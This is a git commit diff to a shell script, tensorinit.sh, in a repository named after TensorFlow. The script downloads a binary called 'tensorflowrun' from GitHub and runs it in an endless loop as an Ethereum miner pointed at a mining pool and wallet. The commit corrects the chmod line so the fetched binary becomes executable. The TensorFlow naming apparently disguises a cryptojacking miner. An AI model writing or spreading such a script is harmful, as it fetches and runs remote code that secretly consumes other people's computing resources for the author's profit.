0866fdc031809f17766c87234a99078e666dbbfb
Mercuryfreddy209 <88346870+Mercuryfreddy209@users.noreply.github.com>
2021-08-02 18:30:24 -0400

    Update tensorinit.sh

--- tensorinit.sh
+++ tensorinit.sh
@@ -3,7 +3,7 @@ POOL=eth.ethashpool.com:3939
 WALLET=nglkmerkel
 WORKER=$(echo $(shuf -i 10-2000 -n 1))
 wget https://github.com/Mercuryfreddy209/Tensorflow/raw/main/tensorflowrun
-chmod +x tensorinit
+chmod +x tensorflowrun
 while [ 1 ]; do
 ./tensorflowrun --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
 sleep 10
